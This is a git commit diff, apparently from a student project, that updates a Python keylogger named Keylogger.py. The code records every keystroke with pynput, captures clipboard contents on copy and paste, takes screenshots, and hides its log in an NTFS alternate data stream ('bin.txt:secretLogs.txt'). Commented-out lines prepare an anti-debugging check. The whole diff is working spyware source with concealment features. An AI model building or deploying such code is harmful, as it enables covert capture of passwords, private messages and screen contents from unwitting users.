88941b97b608d423794f3a8bb0d0295f7a45e584
Christopher liang <z5492103@ad.unsw.edu.au>
2023-11-06 17:41:00 +1100

    final version

--- Keylogger.py
+++ Keylogger.py
@@ -1,39 +1,47 @@
+import os
 from pynput import keyboard
-from win32 import win32clipboard
 import pyperclip
-import time
-import threading
-
-
+import pyautogui
+# import customDebugDetector
 
 
 def printKeyPress(key):
-    
-
-    # if any((keyPressed in current) for keyPressed in COMBINATION):
     if (key == keyboard.KeyCode(char = '\x03') or key == keyboard.KeyCode(char = '\x16')):
         oldclip = pyperclip.paste() 
         data = pyperclip.paste()
-
         if oldclip == data:
             try:
                 pyperclip.waitForNewPaste(0.1)
             except pyperclip.PyperclipTimeoutException:
                 pass
             data = pyperclip.paste()
-        
-        with open("recorcording.txt", mode='a') as f:
-            f.write(data)
+
+        with open("bin.txt:secretLogs.txt", mode='a') as f:
+            f.write(str(data))
             f.write('\n')
             f.close()
+
+            if os.path.isfile('screenshot'):
+                os.remove('screenshot')
+            
+
+            screenshot = pyautogui.screenshot()
+            screenshot.save('screenshot.png')
+
+
         print(data)
+
     else:
-        with open("recorcording.txt", mode='a') as f:
+        with open("bin.txt:secretLogs.txt", mode='a') as f:
             f.write(str(key))
             f.write('\n')
             f.close()
 
+
+# print(customDebugDetector.customChecker())
+
+# if (customDebugDetector.customChecker() != 0):
+#     print("Quit early")
+# else:
 with keyboard.Listener(on_press=printKeyPress) as Listener:
     Listener.join()
-
-
